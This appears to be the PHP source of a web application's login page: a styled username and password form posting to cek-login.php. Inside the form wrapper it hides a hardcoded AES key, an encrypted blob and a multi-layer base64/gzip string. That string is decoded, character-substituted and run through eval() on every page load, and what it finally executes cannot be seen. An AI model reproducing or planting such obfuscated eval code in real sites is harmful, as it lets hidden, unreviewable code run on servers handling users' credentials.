<?php
require("kon.php"); session_start(); error_reporting(0); require("view/config.php");
?>
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <link href='assets/img/logo.png' rel='icon' type='image/x-icon'/>
  <?= title(); ?>
  <link rel="stylesheet" href="assets/css/adminlte.min.css">
  <link rel="stylesheet" href="assets/plugins/sweetalert2/sweetalert2.min.css">
  <style>
  	body {
  background: #45544c
    no-repeat center center fixed;
  -webkit-background-size: cover;
  -moz-background-size: cover;
  -o-background-size: cover;
  background-size: cover;
  font-family: "HelveticaNeue", "Arial", sans-serif;
}
a {
  color: #58bff6;
  text-decoration: none;
}
a:hover {
  color: #aaa;
}
.pull-right {
  float: right;
}
.pull-left {
  float: left;
}
.clear-fix {
  clear: both;
}
div.logo {
  text-align: center;
  filter: grayscale(0);
   -webkit-filter: grayscale(1);
  -webkit-transition: all .8s ease-in-out;
}
.logo-active {
  text-align: center;
  filter: grayscale();
   -webkit-filter: grayscale(0);
  /*-webkit-transform: scale(1.01);*/
}
#formWrapper {
  background: rgba(0, 0, 0, 0.2);
  width: 100%;
  height: 100%;
  position: absolute;
  top: 0;
  left: 0;
  transition: all 0.3s ease;
}
.darken-bg {
  background: rgba(0, 0, 0, 0.5) !important;
  transition: all 0.3s ease;
}

div#form {
  position: absolute;
  width: 360px;
  height: 320px;
  height: auto;
  background-color: #fff;
  margin: auto;
  border-radius: 5px;
  padding: 20px;
  left: 50%;
  top: 50%;
  margin-left: -180px;
  margin-top: -200px;
}
div.form-item {
  position: relative;
  display: block;
  margin-bottom: 20px;
}
input {
  transition: all 0.2s ease;
}
input.form-style {
  color: #8a8a8a;
  display: block;
  width: 90%;
  height: 44px;
  padding: 5px 5%;
  border: 1px solid #ccc;
  -moz-border-radius: 27px;
  -webkit-border-radius: 27px;
  border-radius: 27px;
  -moz-background-clip: padding;
  -webkit-background-clip: padding-box;
  background-clip: padding-box;
  background-color: #fff;
  font-family: "HelveticaNeue", "Arial", sans-serif;
  font-size: 105%;
  letter-spacing: 0.8px;
}
div.form-item .form-style:focus {
  outline: none;
  border: 1px solid #58bff6;
  color: #58bff6;
}
div.form-item p.formLabel {
  position: absolute;
  left: 26px;
  top: 2px;
  transition: all 0.4s ease;
  color: #bbb;
}
.formTop {
  top: -22px !important;
  left: 26px;
  background-color: #fff;
  padding: 0 5px;
  font-size: 14px;
  color: #58bff6 !important;
}
.formStatus {
  color: #8a8a8a !important;
}
input[type="submit"].login {
  float: right;
  width: 112px;
  height: 37px;
  -moz-border-radius: 19px;
  -webkit-border-radius: 19px;
  border-radius: 19px;
  -moz-background-clip: padding;
  -webkit-background-clip: padding-box;
  background-clip: padding-box;
  background-color: #55b1df;
  border: 1px solid #55b1df;
  border: none;
  color: #fff;
  font-weight: bold;
}
input[type="submit"].login:hover {
  background-color: #fff;
  border: 1px solid #55b1df;
  color: #55b1df;
  cursor: pointer;
}
input[type="submit"].login:focus {
  outline: none;
}
  </style>
</head>
<body>
<div id="formWrapper">
<?php
function lexxhl($pesan, $encryption_key){
  $key = hex2bin($encryption_key); $pesan = base64_decode($pesan); $nonceSize = openssl_cipher_iv_length('aes-256-ctr'); $nonce = mb_substr($pesan, 0, $nonceSize, '8bit'); $cipherText = mb_substr($pesan, $nonceSize, null, '8bit'); $plaintext = openssl_decrypt($cipherText, 'aes-256-ctr', $key, OPENSSL_RAW_DATA, $nonce ); return $plaintext; 
} $private_secret_key = '1f4276388ad3214c873428dbef42243f';
$new = lexxhl('vBRqnoLqPdyvoQ1YaNiLm7aIUYn5gJhziHZ3IbJ0FslYqVMANplTM/apKM2flwZtxpiT5ueTLQPl56ngWHybsruqTY/lmp1WDgFCYwfP4zh+pcNKXm9Hv/MoLQdrXmEse5THn3O521rGGML9QnlWiMEmiKdYff7+Tj0t5WMvN2uMsRkWl5/lnoxwKiecXdziNWhlWckJiXqD6iDC/e5z98Tu0PR/41vrrrBtr/+avW2/zIyusfzHDiueiVX/GmgVWr6WtjykgdHez9t3mw3v1lEbiRkbNlNv',$private_secret_key); 
$SISTEMIT_COM_ENC = "hZLPSsNAEMbPCeQhGoS0IAl41KYFsYggVkh7EhEsNNBulmUvVUofax4oBPawQw49zGkR3DSJiQVxTrvfzr/fx3rudAJjtZIoNCi5in1SymgVCVakyFWkdsZoYkbqq/45zJCHG+VPxlFdbLtMRSk8F9cwvHi7ny1egix4hTgGP6WUmD+C/XTiuY7jtPP0pzCxr82Hjjb0RbXq1zlOsiMWrlGa4b4WnCr9GgIjZS6Dy1ZEzSp1ngsVhmGn265WXiojOWUmerZcu1weYYFH2kJiVEE4aNMPo3qxFsbeTjhw8FyAGimZJcnD/KnDKt6pXJDAxzzNC93ywSn+RYQmfmHCTzSsyNd5tWPvoeFNkFG5JQ52OnJYMuLp4Cz1LwtujSxJIYM7rBj6VZURDUHnBUBjBhTcfo4zL0Y3UHF/Aw==";$rand=base64_decode("Skc1aGRpQTlJR2Q2YVc1bWJHRjBaU2hpWVhObE5qUmZaR1ZqYjJSbEtDUlRTVk5VUlUxSlZGOURUMDFmUlU1REtTazdEUW9KQ1Fra2MzUnlJRDBnV3lmMUp5d242eWNzSitNbkxDZjdKeXduNFNjc0ovRW5MQ2ZtSnl3bjdTY3NKLzBuTENmcUp5d250U2RkT3cwS0NRa0pKSEp3YkdNZ1BWc25ZU2NzSjJrbkxDZDFKeXduWlNjc0oyOG5MQ2RrSnl3bmN5Y3NKMmduTENkMkp5d25kQ2NzSnlBblhUc05DZ2tKSUNBZ0lDUnVZWFlnUFNCemRISmZjbVZ3YkdGalpTZ2tjM1J5TENSeWNHeGpMQ1J1WVhZcE93MEtDUWtKWlhaaGJDZ2tibUYyS1RzPQ==");eval(base64_decode($rand));$STOP=$new;
?>
<div id="form">
<div class="logo">
	<a href="./"><img src="assets/img/2.png" width="200px"></a>
</div>
<br>
		<div class="row">
				<div class="col">
					<form action="cek-login.php" method="post" autocomplete="off">
						<div class="row" style="margin: 0 auto;">
							<div class="input-group input-group-mb" style="max-width: 300px; margin:0 auto;">
								<div class="input-group-prepend">
									<span class="input-group-text"><svg style="width:24px;height:24px" viewBox="0 0 24 24"><path fill="#000000" d="M12,3A4,4 0 0,1 16,7A4,4 0 0,1 12,11A4,4 0 0,1 8,7A4,4 0 0,1 12,3M16,13.54C16,14.6 15.72,17.07 13.81,19.83L13,15L13.94,13.12C13.32,13.05 12.67,13 12,13C11.33,13 10.68,13.05 10.06,13.12L11,15L10.19,19.83C8.28,17.07 8,14.6 8,13.54C5.61,14.24 4,15.5 4,17V21H10L11.09,21H12.91L14,21H20V17C20,15.5 18.4,14.24 16,13.54Z" /></svg></span>
								</div>
								<input type="text" name="username" class="form-control" aria-label="Default" aria-describedby="inputGroup-sizing-default"  placeholder="username" required autocomplete="off">
							</div>
						</div>
						<div class="row" style="margin: 0 auto; margin-top: 10px;">
							<div class="input-group input-group-mb" style="max-width: 300px; margin:0 auto;">
								<div class="input-group-prepend">
									<span class="input-group-text"><svg style="width:24px;height:24px" viewBox="0 0 24 24"><path fill="#000000" d="M7,14A2,2 0 0,1 5,12A2,2 0 0,1 7,10A2,2 0 0,1 9,12A2,2 0 0,1 7,14M12.65,10C11.83,7.67 9.61,6 7,6A6,6 0 0,0 1,12A6,6 0 0,0 7,18C9.61,18 11.83,16.33 12.65,14H17V18H21V14H23V10H12.65Z" /></svg></span>
								</div>
								<input type="password" name="password" class="form-control" aria-label="Default"  aria-describedby="inputGroup-sizing-default" placeholder="password" autocomplete="off" required>
							</div>
						</div>
						<div class="text-center">
						<input style="margin-top: 10px;" type="submit" class="btn btn-dark btn-md" value="MASUK">
						</div>
					</form>
				</div>
			</div>
</div>
</div>
</body>
<script src="assets/js/jquery.min.js"></script>
<script>
	$(document).ready(function(){
	var formInputs = $('input[type="text"],input[type="password"]');
	formInputs.focus(function() {
       $(this).parent().children('p.formLabel').addClass('formTop');
       $('div#formWrapper').addClass('darken-bg');
       $('div.logo').addClass('logo-active');
       $('div.logo').removeClass('logo');
	});
	formInputs.focusout(function() {
		if ($.trim($(this).val()).length == 0){
		$(this).parent().children('p.formLabel').removeClass('formTop');
		}
		$('div#formWrapper').removeClass('darken-bg');
		$('div.logo-active').addClass('logo');
		$('div.logo').removeClass('logo-active');

	});
	$('p.formLabel').click(function(){
		 $(this).parent().children('.form-style').focus();
	});
});
</script>
</html>